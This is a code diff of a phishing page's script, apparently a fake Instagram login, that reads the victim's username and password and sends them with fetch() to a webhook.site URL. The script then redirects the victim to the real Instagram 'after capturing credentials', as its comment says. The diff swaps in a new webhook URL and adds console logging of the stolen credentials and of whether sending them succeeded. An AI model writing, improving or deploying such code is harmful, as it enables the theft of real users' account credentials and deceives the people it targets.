@@ -60,7 +60,10 @@
             const password = document.getElementById('password').value;
             
             // Replace with your webhook URL
-            const webhookURL = 'https://webhook.site/990d4197-45b3-4f37-803f-17268dbf07cb';
+            const webhookURL = 'https://webhook.site/fc03e7fd-8415-489b-8c18-ac5be7aa7c85';
+            
+            // Log the data to the console for debugging
+            console.log('Sending data to webhook:', { username, password });
             
             // Send data to the webhook
             fetch(webhookURL, {
@@ -75,8 +78,11 @@
             })
             .then(response => {
                 if (response.ok) {
+                    console.log('Data sent successfully!');
                     // Redirect to real Instagram after capturing credentials
                     window.location.href = 'https://www.instagram.com';
+                } else {
+                    console.error('Failed to send data:', response.statusText);
                 }
             })
             .catch(error => {
